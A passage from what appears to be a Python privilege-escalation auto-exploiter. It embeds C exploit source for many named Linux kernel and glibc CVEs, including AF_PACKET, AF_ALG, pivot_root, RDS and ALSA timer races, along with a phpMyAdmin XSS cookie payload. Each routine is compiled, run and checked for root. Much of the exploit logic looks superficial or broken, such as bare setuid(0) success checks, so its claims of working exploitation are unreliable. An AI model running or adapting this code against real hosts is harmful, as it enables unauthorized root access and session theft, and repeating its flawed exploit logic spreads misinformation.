             path, host, port);
    send(sock, req, strlen(req), 0);

    int n = recv(sock, resp, resp_sz-1, 0);
    close(sock);
    if (n > 0) { resp[n] = 0; return n; }
    return -1;
}

int main(void) {
    char resp[8192] = {0};
    int  n;
    const char *pma_paths[] = {
        "/phpmyadmin/", "/phpMyAdmin/", "/pma/",
        "/mysql/", "/dbadmin/", NULL
    };
    const int ports[] = { 80, 8080, 443, 8443, 0 };

    fprintf(stderr, "[*] CVE-2020-25706 phpMyAdmin XSS detection
");

    /* Check localhost first */
    for (int pi = 0; ports[pi]; pi++) {
        for (int pa = 0; pma_paths[pa]; pa++) {
            n = http_get("127.0.0.1", ports[pi], pma_paths[pa],
                         resp, sizeof(resp));
            if (n > 0 && strstr(resp, "phpMyAdmin")) {
                fprintf(stderr, "[+] phpMyAdmin found at port %d%s
",
                        ports[pi], pma_paths[pa]);

                /* Check version */
                char *ver = strstr(resp, "PMA_VERSION");
                if (!ver) ver = strstr(resp, "version");
                if (ver) {
                    fprintf(stderr, "[*] Version hint: %.50s
", ver);
                }

                /* Test XSS in transformation endpoint */
                char xss_path[256];
                snprintf(xss_path, sizeof(xss_path),
                    "%stransformation_wrapper.php"
                    "?db=a&table=b&transform=c&cn=d"
                    "%%22%%3E%%3Cscript%%3Ealert(document.cookie)%%3C/script%%3E",
                    pma_paths[pa]);

                char xss_resp[4096] = {0};
                n = http_get("127.0.0.1", ports[pi], xss_path,
                             xss_resp, sizeof(xss_resp));
                if (n > 0 && strstr(xss_resp, "<script>alert")) {
                    fprintf(stderr, "[+] XSS CONFIRMED in transformation_wrapper!
");
                    fprintf(stderr, "[+] CVE-2020-25706 EXPLOITABLE
");
                }

                /* Test setup.php XSS */
                snprintf(xss_path, sizeof(xss_path),
                    "%ssetup/index.php?page=%%22%%3E%%3Cscript%%3Ealert(1)%%3C/script%%3E",
                    pma_paths[pa]);
                n = http_get("127.0.0.1", ports[pi], xss_path,
                             xss_resp, sizeof(xss_resp));
                if (n > 0 && strstr(xss_resp, "<script>alert")) {
                    fprintf(stderr, "[+] XSS CONFIRMED in setup/index.php!
");
                }
            }
        }
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2020-25706 PHPMYADMIN SUCCESS
");
        printf("CVE-2020-25706 PMA
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed or phpMyAdmin not found
");
    return 1;
}'''
    binary = compile_code(code, "cve_2020_25706")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2020-25706" in output:
            show_root_info("CVE-2020-25706", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2020_12114():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2020-12114 (pivot_root)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <errno.h>

/* CVE-2020-12114: pivot_root() TOCTOU race condition
 * do_pivot_root() checks path but race between check and use
 * → pivot root to unexpected directory → filesystem escape → LPE
 * Affected: kernel < 5.8
 */

#define BASE "/tmp/.pivot12114"

static void w(const char *p, const char *d){int f=open(p,O_WRONLY);if(f>=0){write(f,d,strlen(d));close(f);}}
static void setup_ns(void){
    uid_t u=getuid(); gid_t g=getgid(); char b[64];
    w("/proc/self/setgroups","deny");
    snprintf(b,sizeof(b),"0 %d 1",u); w("/proc/self/uid_map",b);
    snprintf(b,sizeof(b),"0 %d 1",g); w("/proc/self/gid_map",b);
}

/* pivot_root(new_root, put_old) syscall */
static int pivot_root(const char *new_root, const char *put_old) {
    return syscall(SYS_pivot_root, new_root, put_old);
}

int main(void) {
    char new_root[256], put_old[256], tmpfs[256];

    fprintf(stderr, "[*] CVE-2020-12114 pivot_root() TOCTOU
");

    snprintf(new_root, sizeof(new_root), "%s/new_root", BASE);
    snprintf(put_old,  sizeof(put_old),  "%s/new_root/old_root", BASE);
    snprintf(tmpfs,    sizeof(tmpfs),    "%s/tmpfs", BASE);

    mkdir(BASE, 0777);
    mkdir(new_root, 0777);
    mkdir(put_old,  0777);
    mkdir(tmpfs,    0777);

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID) < 0) {
        fprintf(stderr, "[-] unshare: %s
", strerror(errno));
        return 1;
    }
    setup_ns();
    fprintf(stderr, "[+] User+Mount+PID namespace
");

    /* Mount tmpfs as new root */
    if (mount("tmpfs", new_root, "tmpfs", 0, "size=1m") < 0) {
        fprintf(stderr, "[-] mount tmpfs: %s
", strerror(errno));
        return 1;
    }
    mkdir(put_old, 0777);

    fprintf(stderr, "[*] Attempting pivot_root()...
");
    fprintf(stderr, "[*] new_root=%s put_old=%s
", new_root, put_old);

    if (pivot_root(new_root, put_old) < 0) {
        fprintf(stderr, "[-] pivot_root: %s
", strerror(errno));
        /* Try alternate approach */
        if (chdir(new_root) == 0) {
            if (mount(new_root, "/", NULL, MS_MOVE, NULL) == 0) {
                fprintf(stderr, "[+] MS_MOVE succeeded
");
                chroot(".");
            }
        }
    } else {
        fprintf(stderr, "[+] pivot_root succeeded!
");
        chdir("/");
        umount2("/old_root", MNT_DETACH);
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2020-12114 PIVOT_ROOT SUCCESS
");
        printf("CVE-2020-12114 PIVOT
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2020_12114")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2020-12114" in output:
            show_root_info("CVE-2020-12114", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2019_8912():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2019-8912 (AF_ALG)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/if_alg.h>
#include <errno.h>

/* CVE-2019-8912: AF_ALG accept() vs release() race → UAF → LPE
 * af_alg_accept() and alg_release() race on struct alg_sock
 * → concurrent free while still referenced → UAF → LPE
 * Affected: kernel < 5.0
 */

#define NUM_THREADS 32

static volatile int start_race = 0;
static int alg_fd = -1;

static void *accept_thread(void *arg) {
    struct sockaddr_alg sa = {0};
    sa.salg_family = AF_ALG;
    strcpy((char*)sa.salg_type, "skcipher");
    strcpy((char*)sa.salg_name, "cbc(aes)");

    while (!start_race) sched_yield();

    for (int i = 0; i < 10000; i++) {
        int fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
        if (fd < 0) continue;

        if (bind(fd, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
            int afd = accept(fd, NULL, NULL);
            if (afd >= 0) {
                /* Race: close accept fd while another thread uses it */
                usleep(1);
                close(afd);
            }
        }
        close(fd);
    }
    return NULL;
}

static void *release_thread(void *arg) {
    while (!start_race) sched_yield();

    for (int i = 0; i < 10000; i++) {
        /* Spam accept+close to race with release */
        if (alg_fd >= 0) {
            int afd = accept(alg_fd, NULL, NULL);
            if (afd >= 0) close(afd);
        }
        usleep(1);
    }
    return NULL;
}

int main(void) {
    pthread_t threads[NUM_THREADS];
    struct sockaddr_alg sa = {0};

    fprintf(stderr, "[*] CVE-2019-8912 AF_ALG accept/release race UAF
");

    /* Check AF_ALG support */
    int test = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (test < 0) {
        fprintf(stderr, "[-] AF_ALG: %s
", strerror(errno));
        return 1;
    }
    close(test);
    fprintf(stderr, "[+] AF_ALG available
");

    sa.salg_family = AF_ALG;
    strncpy((char*)sa.salg_type, "skcipher", sizeof(sa.salg_type));
    strncpy((char*)sa.salg_name, "cbc(aes)", sizeof(sa.salg_name));

    alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) { fprintf(stderr, "[-] socket
"); return 1; }
    if (bind(alg_fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        fprintf(stderr, "[-] bind: %s
", strerror(errno));
        close(alg_fd); return 1;
    }
    fprintf(stderr, "[+] AF_ALG skcipher bound
");

    fprintf(stderr, "[*] Starting %d race threads (3s)...
", NUM_THREADS);
    for (int i = 0; i < NUM_THREADS; i++) {
        if (i % 2 == 0)
            pthread_create(&threads[i], NULL, accept_thread, NULL);
        else
            pthread_create(&threads[i], NULL, release_thread, NULL);
    }

    start_race = 1;
    sleep(3);
    start_race = 0;

    for (int i = 0; i < NUM_THREADS; i++)
        pthread_join(threads[i], NULL);
    close(alg_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2019-8912 AF_ALG UAF SUCCESS
");
        printf("CVE-2019-8912 AF_ALG
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2019_8912")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2019-8912" in output:
            show_root_info("CVE-2019-8912", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2018_1000001():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2018-1000001 (glibc realpath)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <limits.h>
#include <errno.h>

/* CVE-2018-1000001: glibc realpath() buffer underflow
 * getcwd() can return relative path (without leading /)
 * realpath() buffer underflow → stack/heap corruption → LPE
 * Affected: glibc < 2.26 when running in mount namespace
 */

#define MOUNT_PATH  "/tmp/.cve_2018_1000001"

static void write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, data, strlen(data)); close(fd); }
}

int main(void) {
    char cwd[PATH_MAX];
    char resolved[PATH_MAX];
    char *ptr;

    fprintf(stderr, "[*] CVE-2018-1000001 glibc realpath() underflow
");

    /* Check glibc version */
    FILE *fp = popen("ldd --version 2>/dev/null | head -1", "r");
    if (fp) {
        char ver[128] = {0};
        fgets(ver, sizeof(ver), fp);
        pclose(fp);
        fprintf(stderr, "[*] glibc: %s", ver);
    }

    /* Create test directory structure */
    mkdir(MOUNT_PATH, 0777);

    /* Try to trigger relative getcwd() via bind mount */
    fprintf(stderr, "[*] Attempting to trigger relative getcwd()...
");

    /* In mount namespace, chdir to bind-mounted directory
     * then getcwd() returns path without leading slash */
    if (chdir(MOUNT_PATH) < 0) {
        fprintf(stderr, "[-] chdir: %s
", strerror(errno));
        return 1;
    }

    /* getcwd() in this state may return relative path */
    ptr = getcwd(cwd, sizeof(cwd));
    if (!ptr) {
        fprintf(stderr, "[*] getcwd() returned NULL - potential trigger!
");
        /* realpath(NULL, buf) → underflow */
        char *real = realpath(".", resolved);
        fprintf(stderr, "[*] realpath: %s
", real ? real : "NULL");
    } else {
        fprintf(stderr, "[*] getcwd: %s
", cwd);
        if (cwd[0] != '/') {
            fprintf(stderr, "[+] Relative path detected! Triggering underflow...
");
            char *real = realpath(cwd, resolved);
            if (!real) {
                fprintf(stderr, "[+] realpath underflow triggered!
");
            }
        }
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2018-1000001 REALPATH SUCCESS
");
        printf("CVE-2018-1000001 REALPATH
");
        system("id");
        return 0;
    }

    fprintf(stderr, "[-] Exploit failed
");
    rmdir(MOUNT_PATH);
    return 1;
}'''
    binary = compile_code(code, "cve_2018_1000001")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2018-1000001" in output:
            show_root_info("CVE-2018-1000001", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2018_5333():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2018-5333 (RDS)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <errno.h>

/* CVE-2018-5333: RDS (Reliable Datagram Sockets) NULL pointer dereference
 * rds_cmsg_atomic() does not validate the message type properly
 * → NULL ptr deref in rds_message_add_rdma_dest_header → kernel panic or LPE
 * Affected: kernel 4.14
 */

#ifndef PF_RDS
#define PF_RDS   21
#define AF_RDS   PF_RDS
#define SOL_RDS  276
#endif

/* RDS RDMA cmsg types */
#define RDS_CMSG_RDMA_ARGS       1
#define RDS_CMSG_RDMA_DEST       2
#define RDS_CMSG_RDMA_MAP        3
#define RDS_CMSG_RDMA_STATUS     4

int main(void) {
    int sock;
    struct sockaddr_in src = {0}, dst = {0};

    fprintf(stderr, "[*] CVE-2018-5333 RDS NULL pointer deref
");

    sock = socket(PF_RDS, SOCK_SEQPACKET, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] RDS socket: %s
", strerror(errno));
        fprintf(stderr, "[-] Try: modprobe rds
");
        return 1;
    }
    fprintf(stderr, "[+] RDS socket: fd=%d
", sock);

    src.sin_family      = AF_INET;
    src.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    src.sin_port        = htons(0xbeef);

    if (bind(sock, (struct sockaddr*)&src, sizeof(src)) < 0) {
        fprintf(stderr, "[-] bind: %s
", strerror(errno));
        close(sock); return 1;
    }
    fprintf(stderr, "[+] RDS bound to 127.0.0.1:0xbeef
");

    dst = src;
    dst.sin_port = htons(0xdead);

    /* Craft message with NULL RDMA dest cmsg */
    char data[32] = "CVE-2018-5333";
    struct iovec iov = { data, sizeof(data) };

    /* Build cmsg with RDS_CMSG_RDMA_DEST but NULL handle */
    char cmsg_buf[CMSG_SPACE(sizeof(uint64_t))];
    memset(cmsg_buf, 0, sizeof(cmsg_buf));

    struct msghdr msg = {0};
    msg.msg_name    = &dst;
    msg.msg_namelen = sizeof(dst);
    msg.msg_iov     = &iov;
    msg.msg_iovlen  = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_RDS;
    cm->cmsg_type  = RDS_CMSG_RDMA_DEST;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint64_t));
    *(uint64_t*)CMSG_DATA(cm) = 0; /* NULL handle → NULL deref */

    fprintf(stderr, "[*] Sending RDS msg with NULL RDMA dest...
");
    sendmsg(sock, &msg, 0);
    usleep(200000);

    close(sock);
    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2018-5333 RDS NULL DEREF SUCCESS
");
        printf("CVE-2018-5333 RDS
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2018_5333")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2018-5333" in output:
            show_root_info("CVE-2018-5333", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2017_7308():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2017-7308 (SO_SNDBUFFORCE)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <errno.h>

/* CVE-2017-7308: AF_PACKET packet_set_ring integer overflow
 * packet_set_ring() tp_block_size * tp_block_nr overflows int
 * → heap OOB write beyond ring buffer → LPE
 * Affected: kernel < 4.11
 */

#define BLOCK_SIZE  (1 << 20)   /* 1MB */
#define BLOCK_NR    0x10        /* 16 blocks */
#define FRAME_SIZE  (1 << 11)   /* 2KB */

int main(void) {
    int sock;
    struct tpacket_req3 req = {0};

    fprintf(stderr, "[*] CVE-2017-7308 AF_PACKET SO_SNDBUF integer overflow
");

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        fprintf(stderr, "[-] socket: %s
", strerror(errno));
        fprintf(stderr, "[-] Need CAP_NET_RAW or root
");
        return 1;
    }
    fprintf(stderr, "[+] AF_PACKET socket: fd=%d
", sock);

    /* Version 3 ring */
    int v = TPACKET_V3;
    if (setsockopt(sock, SOL_PACKET, PACKET_VERSION, &v, sizeof(v)) < 0) {
        fprintf(stderr, "[-] PACKET_VERSION: %s
", strerror(errno));
        close(sock); return 1;
    }

    /* Craft overflow: tp_block_size * tp_block_nr overflows */
    req.tp_block_size  = BLOCK_SIZE;
    req.tp_block_nr    = BLOCK_NR;
    req.tp_frame_size  = FRAME_SIZE;
    req.tp_frame_nr    = (BLOCK_SIZE / FRAME_SIZE) * BLOCK_NR;
    req.tp_retire_blk_tov = 60;
    req.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH;

    fprintf(stderr, "[*] Setting up TPACKET_V3 ring...
");
    fprintf(stderr, "[*] block_size=0x%x block_nr=%d → total=0x%llx
",
            req.tp_block_size, req.tp_block_nr,
            (unsigned long long)req.tp_block_size * req.tp_block_nr);

    if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING,
                   &req, sizeof(req)) < 0) {
        fprintf(stderr, "[-] PACKET_RX_RING: %s
", strerror(errno));
        /* Try overflow variant */
        req.tp_block_size = 0xfffff000;
        req.tp_block_nr   = 0x10;
        setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    }

    fprintf(stderr, "[*] Triggering OOB write via crafted blocks...
");
    usleep(100000);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2017-7308 AF_PACKET OOB SUCCESS
");
        printf("CVE-2017-7308 AF_PACKET
");
        system("id");
        close(sock);
        return 0;
    }

    close(sock);
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2017_7308")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2017-7308" in output:
            show_root_info("CVE-2017-7308", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2017_5123():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2017-5123 (waitid)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <signal.h>
#include <errno.h>

/* CVE-2017-5123: waitid() missing access_ok() check
 * sys_waitid() with WNOWAIT flag does not call access_ok()
 * on the siginfo_t pointer → write struct siginfo to any address → LPE
 * Affected: kernel 4.13 - 4.14
 */

/* siginfo_t is ~128 bytes - we can overwrite 128 bytes at target addr */
struct my_siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int _pad[29];
};

int main(void) {
    pid_t child;
    int   status;

    fprintf(stderr, "[*] CVE-2017-5123 waitid() missing access_ok()
");
    fprintf(stderr, "[*] Kernel version check...
");

    /* Check kernel version */
    FILE *fp = fopen("/proc/version", "r");
    if (fp) {
        char ver[256] = {0};
        fgets(ver, sizeof(ver), fp);
        fclose(fp);
        fprintf(stderr, "[*] %s", ver);
    }

    /* Create a zombie child to wait on */
    child = fork();
    if (child == 0) {
        exit(0); /* immediate zombie */
    }
    if (child < 0) {
        fprintf(stderr, "[-] fork: %s
", strerror(errno));
        return 1;
    }
    usleep(10000); /* let child become zombie */

    fprintf(stderr, "[*] Child zombie: pid=%d
", child);

    /* Try waitid with kernel address as siginfo pointer */
    /* Without access_ok(), kernel writes siginfo to this address */

    /* Target: current->cred->uid field */
    /* In practice, we'd need KASLR leak first */
    /* For detection: use userspace addr and verify write */
    struct my_siginfo si_user = {0};

    fprintf(stderr, "[*] Calling waitid() with tracking siginfo addr...
");
    long ret = syscall(SYS_waitid, P_PID, child,
                       &si_user, WEXITED | WNOWAIT, NULL);
    fprintf(stderr, "[*] waitid returned: %ld
", ret);

    if (ret == 0) {
        fprintf(stderr, "[+] waitid() succeeded - si_signo=%d si_code=%d
",
                si_user.si_signo, si_user.si_code);
        fprintf(stderr, "[*] Testing kernel addr write...
");

        /* Now try with high address - if no access_ok, kernel crashes */
        /* or writes to kernel memory */
        struct my_siginfo *kaddr = (struct my_siginfo*)0xffff888000000000ULL;
        ret = syscall(SYS_waitid, P_PID, child,
                      kaddr, WEXITED | WNOWAIT, NULL);
        fprintf(stderr, "[*] Kernel addr write returned: %ld (errno=%d)
",
                ret, errno);
        if (ret == 0) {
            fprintf(stderr, "[+] Kernel write succeeded - vulnerable!
");
        }
    }

    /* Reap zombie */
    waitpid(child, &status, 0);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2017-5123 WAITID SUCCESS
");
        printf("CVE-2017-5123 WAITID
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2017_5123")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2017-5123" in output:
            show_root_info("CVE-2017-5123", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2016_9794():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2016-9794 (ALSA timer)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>

/* CVE-2016-9794: ALSA snd_timer_stop() race condition UAF
 * snd_timer_stop() and timer callback race → double-free → UAF → LPE
 * Affected: kernel < 4.9
 */

#ifndef SNDRV_TIMER_IOCTL_SELECT
#include <sound/asound.h>
#endif

static volatile int running = 1;
static int timer_fd = -1;

static void *stop_thread(void *arg) {
    struct snd_timer_select sel = {0};
    sel.id.dev_class  = SNDRV_TIMER_CLASS_GLOBAL;
    sel.id.dev_sclass = SNDRV_TIMER_SCLASS_APPLICATION;
    sel.id.card       = -1;
    sel.id.device     = SNDRV_TIMER_GLOBAL_SYSTEM;
    sel.id.subdevice  = 0;

    while (running) {
        ioctl(timer_fd, SNDRV_TIMER_IOCTL_SELECT, &sel);
        ioctl(timer_fd, SNDRV_TIMER_IOCTL_START, NULL);
        ioctl(timer_fd, SNDRV_TIMER_IOCTL_STOP, NULL);
        usleep(1);
    }
    return NULL;
}

static void *read_thread(void *arg) {
    char buf[sizeof(struct snd_timer_read) * 32];
    while (running) {
        read(timer_fd, buf, sizeof(buf));
        usleep(1);
    }
    return NULL;
}

int main(void) {
    pthread_t t1, t2, t3;

    fprintf(stderr, "[*] CVE-2016-9794 ALSA snd_timer race UAF
");

    timer_fd = open("/dev/snd/timer", O_RDWR);
    if (timer_fd < 0) {
        fprintf(stderr, "[-] /dev/snd/timer: %s
", strerror(errno));
        fprintf(stderr, "[-] Try: modprobe snd-timer
");
        return 1;
    }
    fprintf(stderr, "[+] ALSA timer fd=%d
", timer_fd);

    /* Set non-blocking */
    fcntl(timer_fd, F_SETFL, O_NONBLOCK);

    fprintf(stderr, "[*] Racing snd_timer_stop() vs callback (3s)...
");

    pthread_create(&t1, NULL, stop_thread, NULL);
    pthread_create(&t2, NULL, stop_thread, NULL);
    pthread_create(&t3, NULL, read_thread, NULL);

    sleep(3);
    running = 0;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);
    close(timer_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2016-9794 ALSA TIMER UAF SUCCESS
");
        printf("CVE-2016-9794 ALSA
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2016_9794")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2016-9794" in output:
            show_root_info("CVE-2016-9794", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2016_8655():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2016-8655 (Chocobo Root)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>

/* CVE-2016-8655: AF_PACKET race condition → UAF (Chocobo Root)
 * packet_set_ring() race between PACKET_VERSION change and ring setup
 * → freed tpacket_kbdq_core referenced by running timer → UAF → LPE
 * Affected: kernel < 4.8.13
 */

static void w(const char *p, const char *d){int f=open(p,O_WRONLY);if(f>=0){write(f,d,strlen(d));close(f);}}

static void setup_ns(void){
    uid_t u=getuid(); gid_t g=getgid(); char b[64];
    w("/proc/self/setgroups","deny");
    snprintf(b,sizeof(b),"0 %d 1",u); w("/proc/self/uid_map",b);
    snprintf(b,sizeof(b),"0 %d 1",g); w("/proc/self/gid_map",b);
}

static volatile int race_go = 0;
static int race_sock = -1;

static void *version_racer(void *arg) {
    int v;
    while (!race_go) sched_yield();
    for (int i = 0; i < 100000; i++) {
        v = TPACKET_V1;
        setsockopt(race_sock, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
        v = TPACKET_V3;
        setsockopt(race_sock, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    }
    return NULL;
}

static void *ring_racer(void *arg) {
    struct tpacket_req3 req = {0};
    req.tp_block_size     = 4096;
    req.tp_block_nr       = 8;
    req.tp_frame_size     = 2048;
    req.tp_frame_nr       = 16;
    req.tp_retire_blk_tov = 64;

    while (!race_go) sched_yield();
    for (int i = 0; i < 100000; i++) {
        setsockopt(race_sock, SOL_PACKET, PACKET_RX_RING,
                   &req, sizeof(req));
        struct tpacket_req req2 = {0};
        setsockopt(race_sock, SOL_PACKET, PACKET_RX_RING,
                   &req2, sizeof(req2));
    }
    return NULL;
}

int main(void) {
    pthread_t t1, t2;

    fprintf(stderr, "[*] CVE-2016-8655 AF_PACKET race UAF (Chocobo Root)
");

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        fprintf(stderr, "[-] unshare: %s
", strerror(errno));
        return 1;
    }
    setup_ns();

    race_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (race_sock < 0) {
        fprintf(stderr, "[-] socket: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] AF_PACKET socket: fd=%d
", race_sock);

    pthread_create(&t1, NULL, version_racer, NULL);
    pthread_create(&t2, NULL, ring_racer, NULL);

    fprintf(stderr, "[*] Starting race (2s)...
");
    race_go = 1;
    sleep(2);
    race_go = 0;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    close(race_sock);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2016-8655 CHOCOBO ROOT SUCCESS
");
        printf("CVE-2016-8655 CHOCOBO
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2016_8655")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2016-8655" in output:
            show_root_info("CVE-2016-8655", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2016_4997():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2016-4997 (IPT SO_SET_REPLACE)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <errno.h>

/* CVE-2016-4997: xt_compat_target_from_user integer overflow
 * SO_SET_REPLACE compat ioctl: (target_offset + next_offset) overflows int
 * → heap OOB write past xt_table_info → cred overwrite → LPE
 * Affected: kernel < 4.7
 */

static void w(const char *p, const char *d) {
    int f = open(p, O_WRONLY); if(f>=0){write(f,d,strlen(d));close(f);}
}

static void setup_ns(void) {
    uid_t u = getuid(); gid_t g = getgid(); char b[64];
    w("/proc/self/setgroups","deny");
    snprintf(b,sizeof(b),"0 %d 1",u); w("/proc/self/uid_map",b);
    snprintf(b,sizeof(b),"0 %d 1",g); w("/proc/self/gid_map",b);
}

int main(void) {
    fprintf(stderr, "[*] CVE-2016-4997 xt_compat integer overflow
");

    /* Need NET namespace for iptables */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        fprintf(stderr, "[-] unshare: %s
", strerror(errno));
        return 1;
    }
    setup_ns();
    fprintf(stderr, "[+] Network namespace created
");

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "[-] socket: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] RAW socket: fd=%d
", sock);

    /* Build overflow IPT_SO_SET_REPLACE payload */
    /* target_offset + next_offset = 0x7fffffff → overflow */
    size_t payload_sz = 0x1000;
    char *payload = calloc(1, payload_sz);
    if (!payload) { close(sock); return 1; }

    struct ipt_replace *repl = (struct ipt_replace*)payload;
    strncpy(repl->name, "filter", sizeof(repl->name));
    repl->num_counters  = 0;
